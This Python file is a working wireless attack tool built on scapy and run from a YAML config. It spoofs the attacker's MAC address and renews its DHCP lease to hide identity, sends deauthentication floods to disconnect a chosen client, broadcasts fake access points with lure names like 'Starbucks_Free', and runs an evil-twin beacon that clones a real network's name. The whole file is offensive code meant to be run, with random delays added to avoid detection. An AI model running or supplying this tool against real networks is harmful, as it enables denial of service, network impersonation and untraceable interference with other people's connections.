import yaml
import random
import time
import subprocess
import sys
import os
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt

# Ensure script is run with root privileges
if os.geteuid() != 0:
    print("[-] This script must be run as root.")
    sys.exit(1)

def random_mac():
    """Generate a random MAC address."""
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0x00, 0x7F),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF)
    )

def spoof_identity(interface):
    """Spoof MAC address and request a new IP."""
    new_mac = random_mac()
    print(f"[+] Spoofing MAC Address: {new_mac}")
    
    try:
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["macchanger", "-m", new_mac, interface], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        print("[+] Flushing IP settings and requesting new IP...")
        subprocess.run(["dhclient", "-r"], check=True)  # Release IP
        subprocess.run(["dhclient"], check=True)  # Request new IP
        print("[+] New identity applied.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error during spoofing: {e}")
        sys.exit(1)

def send_deauth(target_ap, target_client, interface, power=50, count=100):
    """Send deauthentication packets to a target client."""
    print(f"[+] Sending {count} deauth packets to {target_client} from {target_ap} on {interface}")
    packet = RadioTap() / Dot11(addr1=target_client, addr2=target_ap, addr3=target_ap) / Dot11Deauth()
    
    try:
        subprocess.run(["iwconfig", interface, "txpower", str(power)], check=True)
        for _ in range(count):
            sendp(packet, iface=interface, count=1, inter=random.uniform(0.05, 0.3), verbose=False)
        print("[+] Deauth attack complete.")
    except Exception as e:
        print(f"[-] Error during deauth attack: {e}")

def beacon_flood(interface, num_aps=10):
    """Perform a beacon flood attack by creating fake APs."""
    ssid_list = ["Free WiFi", "Starbucks_Free", "Hotel_WiFi", "Airport_WiFi", "Home_Network", "Xfinity", "Your ISP", "GameServer", "PrivateNet", "Hacked"]
    
    for i in range(num_aps):
        ssid = f"{random.choice(ssid_list)}_{random.randint(1000, 9999)}"
        print(f"[+] Broadcasting Fake AP: {ssid}")
        packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=random_mac(), addr3=random_mac()) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        sendp(packet, iface=interface, count=10, inter=0.1, verbose=False)
    print("[+] Beacon Flood Attack Completed.")

def evil_twin(interface, real_ap_ssid):
    """Create an evil twin AP by cloning a real Wi-Fi network."""
    fake_mac = random_mac()
    print(f"[+] Creating Fake AP: {real_ap_ssid} with MAC {fake_mac}")
    packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=fake_mac, addr3=fake_mac) / Dot11Beacon() / Dot11Elt(ID="SSID", info=real_ap_ssid, len=len(real_ap_ssid))
    
    try:
        while True:
            sendp(packet, iface=interface, count=10, inter=0.2, verbose=False)
    except KeyboardInterrupt:
        print("[+] Evil Twin Attack Stopped.")

def load_config(config_file):
    """Load and validate the YAML configuration file."""
    try:
        with open(config_file, 'r') as f:
            config = yaml.safe_load(f)
        
        if 'attacks' not in config:
            raise ValueError("Config file must contain an 'attacks' key.")
        
        return config
    except Exception as e:
        print(f"[-] Error loading config file: {e}")
        sys.exit(1)

def main():
    """Main function to execute attacks based on the config file."""
    config = load_config('config.yml')
    interface = input("Enter Wireless Interface (in monitor mode): ").strip()
    
    for attack in config['attacks']:
        print(f"\n[+] Starting {attack['mode']} attack...")
        spoof_identity(interface)
        
        if attack['mode'] == 'deauth':
            send_deauth(attack['target_ap'], attack['target_client'], interface, attack.get('power', 50), attack.get('count', 100))
        
        elif attack['mode'] == 'beacon_flood':
            beacon_flood(interface, attack.get('num_aps', 10))
        
        elif attack['mode'] == 'evil_twin':
            evil_twin(interface, attack['real_ap_ssid'])
        
        else:
            print("[!] Unknown attack mode.")
        
        time.sleep(random.randint(10, 30))

if __name__ == "__main__":
    main()